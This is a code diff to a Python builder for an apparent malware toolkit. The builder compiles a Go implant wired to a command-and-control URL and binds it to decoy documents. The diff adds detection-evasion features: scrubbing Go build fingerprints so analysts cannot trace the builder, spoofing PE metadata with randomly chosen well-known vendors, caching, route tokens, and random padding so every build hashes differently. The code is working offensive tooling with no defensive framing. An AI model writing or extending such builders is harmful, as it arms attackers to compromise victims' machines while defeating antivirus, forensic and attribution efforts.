@@ -1,4 +1,4 @@
-import os, re, struct, subprocess, base64, shutil, uuid, secrets
+import os, re, struct, subprocess, base64, shutil, uuid, secrets, random, hashlib
 from pathlib import Path
 
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
@@ -14,13 +14,22 @@ FLAG_ENCRYPTED = 2
 
 SAFE_NAME = re.compile(r"[^A-Za-z0-9._-]+")
 
+# module paths a stripped Go binary still carries in its build info
+MODULES = (b"phantom/implant", b"phantom/stub")
+
+# vendors whose binaries live on every Windows box, so metadata does not stand out
+VENDORS = ("Microsoft Corporation", "Intel Corporation", "Realtek Semiconductor",
+           "NVIDIA Corporation", "Logitech Europe S.A.", "Dell Technologies",
+           "HP Inc.", "Lenovo Group Ltd.", "Adobe Inc.", "Google LLC")
+
 
 class BuildError(Exception):
     pass
 
 
 class Builder:
-    def __init__(self, cfg: dict, psk: str, public_url: str = ""):
+    def __init__(self, cfg: dict, psk: str, public_url: str = "",
+                 server_pub: str = ""):
         self.go = cfg.get("go_bin", "go")
         base = Path(__file__).resolve().parent
         self.implant_dir = (base / cfg["implant_dir"]).resolve()
@@ -31,11 +40,17 @@ class Builder:
         self.cache.mkdir(parents=True, exist_ok=True)
         self.loader_tpl = (base / cfg["loader_template"]).resolve()
         self.psk = psk
+        self.server_pub = server_pub
         self.public_url = public_url or cfg.get("public_url", "https://127.0.0.1:8443")
         self.garble = bool(cfg.get("garble", False))
         self.upx = bool(cfg.get("upx", False))
         self.max_doc = int(cfg.get("max_bind_size", 64 * 1024 * 1024))
         self.vendor = cfg.get("vendor", "Microsoft Corporation")
+        self.randomize = bool(cfg.get("randomize", True))
+        self.scrub = bool(cfg.get("scrub", True))
+        self.stealth = str(cfg.get("stealth", "auto"))
+        self.workers = int(cfg.get("workers", 4))
+        self.pad = bool(cfg.get("pad", True))
         self.encrypt = bool(cfg.get("encrypt_payload", True))
         self.metadata = bool(cfg.get("metadata", True))
         self.sign_pfx = cfg.get("sign_pfx", "")
@@ -75,7 +90,7 @@ class Builder:
                            capture_output=True)
         return out
 
-    def _ldflags(self, goos, url, psk, sleep, jitter, delay, hidden):
+    def _ldflags(self, goos, url, psk, sleep, jitter, delay, hidden, route=""):
         flags = ["-s", "-w", "-buildid="]
         if hidden and goos == "windows":
             flags.append("-H windowsgui")
@@ -85,8 +100,76 @@ class Builder:
             f"-X main.defaultSleep={sleep}",
             f"-X main.defaultJitter={jitter}",
             f"-X main.startDelay={delay}",
+            f"-X main.stealthMode={self.stealth}",
+            f"-X main.maxWorkers={self.workers}",
         ]
+        if route:
+            flags.append(f"-X main.routeTok={route}")
+        if self.server_pub:
+            flags.append(f"-X main.serverPub={self.server_pub}")
         return " ".join(flags)
+
+    @staticmethod
+    def _junk(n: int, keep_slash: str = "") -> bytes:
+        """Random lowercase filler of the same length, slashes preserved."""
+        alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
+        out = [random.choice(alphabet) for _ in range(n)]
+        for i, ch in enumerate(keep_slash):
+            if ch == "/" and i < n:
+                out[i] = "/"
+        return "".join(out).encode()
+
+    def _scrub(self, data: bytes) -> bytes:
+        """Remove the toolchain fingerprints a stripped Go binary still has."""
+        for mod in MODULES:
+            if mod in data:
+                data = data.replace(mod, self._junk(len(mod), mod.decode()))
+        # the build-info blob points at module/version metadata; blank the magic
+        # so strings-based tooling cannot walk it back to the builder
+        data = data.replace(b"\xff Go buildinf:", b"\xff" + b" " * 13)
+        return data
+
+    def _vendor(self) -> str:
+        if self.vendor and not self.randomize:
+            return self.vendor
+        if self.vendor and self.vendor != "Microsoft Corporation":
+            return self.vendor
+        return random.choice(VENDORS)
+
+    def _route(self) -> str:
+        return secrets.token_hex(6)
+
+    def _src_sig(self) -> str:
+        """Fingerprint the implant sources so an edit invalidates the cache."""
+        h = hashlib.sha256()
+        for f in sorted(self.implant_dir.glob("*.go")) + [self.implant_dir / "go.mod"]:
+            if f.is_file():
+                st = f.stat()
+                h.update(f"{f.name}:{st.st_size}:{int(st.st_mtime)}".encode())
+        return h.hexdigest()[:16]
+
+    def _implant_bytes(self, goos, goarch, url, psk, sleep, jitter, delay,
+                       hidden, route) -> bytes:
+        """Compile (or reuse) the implant for one exact configuration."""
+        flags = self._ldflags(goos, url, psk, sleep, jitter, delay, hidden, route)
+        key = hashlib.sha256(
+            f"{goos}|{goarch}|{flags}|{self.garble}|{self.upx}|{self._src_sig()}"
+            .encode()).hexdigest()[:24]
+        ext = ".exe" if goos == "windows" else ""
+        cached = self.cache / f"imp-{key}{ext}"
+        if cached.exists():
+            return cached.read_bytes()
+
+        tmp = self.cache / f"tmp-{os.getpid()}-{uuid.uuid4().hex[:8]}{ext}"
+        try:
+            self._compile(self.implant_dir, tmp, goos, goarch, flags)
+            data = tmp.read_bytes()
+        finally:
+            tmp.unlink(missing_ok=True)
+        if self.scrub:
+            data = self._scrub(data)
+        cached.write_bytes(data)
+        return data
 
     def _stamp(self, data: bytes, product: str, description: str,
                original: str, icon_kind: str = "") -> bytes:
@@ -101,7 +184,7 @@ class Builder:
         if self.metadata:
             try:
                 stem = re.sub(r"[^A-Za-z0-9]+", "", product) or "Updater"
-                vendor = self.vendor or "Acme Software"
+                vendor = self._vendor() or "Acme Software"
                 items += pemetadata.metadata_items(
                     company=vendor,
                     product=product or "Updater",
@@ -155,12 +238,11 @@ class Builder:
         outname = f"{name}-{goos}-{goarch}{ext}"
         binpath = self.out / outname
 
-        self._compile(self.implant_dir, binpath, goos, goarch,
-                      self._ldflags(goos, url, psk, int(sleep), int(jitter),
-                                    int(delay), hidden))
+        data = self._implant_bytes(goos, goarch, url, psk, int(sleep),
+                                   int(jitter), int(delay), hidden, self._route())
         if goos == "windows":
-            binpath.write_bytes(self._stamp(binpath.read_bytes(), name,
-                                            name, outname))
+            data = self._stamp(data, name, name, outname)
+        binpath.write_bytes(data)
 
         result = {"binary": outname, "size": binpath.stat().st_size,
                   "url": url, "os": goos, "arch": goarch, "kind": "implant"}
@@ -179,11 +261,18 @@ class Builder:
 
     def stub_raw(self, goos: str, goarch: str) -> Path:
         """Compiled stub without resources (resources depend on the build)."""
-        path = self.cache / (f"stub-{goos}-{goarch}" + (".exe" if goos == "windows" else ""))
+        try:
+            stamp = int((self.stub_dir / "main.go").stat().st_mtime)
+        except OSError:
+            stamp = 0
+        path = self.cache / (f"stub-{goos}-{goarch}-{stamp}"
+                             + (".exe" if goos == "windows" else ""))
         if path.exists():
             return path
         self._compile(self.stub_dir, path, goos, goarch,
                       self._ldflags(goos, "", "", 0, 0, 0, True))
+        if self.scrub:
+            path.write_bytes(self._scrub(path.read_bytes()))
         return path
 
     def bind(self, goos="windows", goarch="amd64", url=None, psk=None, sleep=3,
@@ -204,14 +293,8 @@ class Builder:
         goos = goos if goos in ("linux", "windows", "darwin") else "windows"
         goarch = goarch if goarch in ("amd64", "arm64", "386") else "amd64"
 
-        tmp = self.cache / f"imp-{os.getpid()}-{uuid.uuid4().hex[:8]}"
-        try:
-            self._compile(self.implant_dir, tmp, goos, goarch,
-                          self._ldflags(goos, url, psk, int(sleep), int(jitter),
-                                        int(delay), hidden))
-            implant = tmp.read_bytes()
-        finally:
-            tmp.unlink(missing_ok=True)
+        implant = self._implant_bytes(goos, goarch, url, psk, int(sleep),
+                                      int(jitter), int(delay), hidden, self._route())
 
         ext = Path(doc_name).suffix
         product = stem.replace("_", " ").title()
@@ -238,7 +321,10 @@ class Builder:
         name_b = doc_name.encode("utf-8")[:200]
         footer = (struct.pack("<IIII", len(sealed), len(doc), len(name_b), flags)
                   + key + nonce + MAGIC)
-        blob = stub_bytes + sealed + doc + name_b + footer
+        # random filler before the payload varies the artifact size, so two
+        # builds of the same document never hash alike
+        pad = os.urandom(random.randint(256, 8192)) if self.pad else b""
+        blob = stub_bytes + pad + sealed + doc + name_b + footer
 
         outpath = self.out / outname
         outpath.write_bytes(blob)
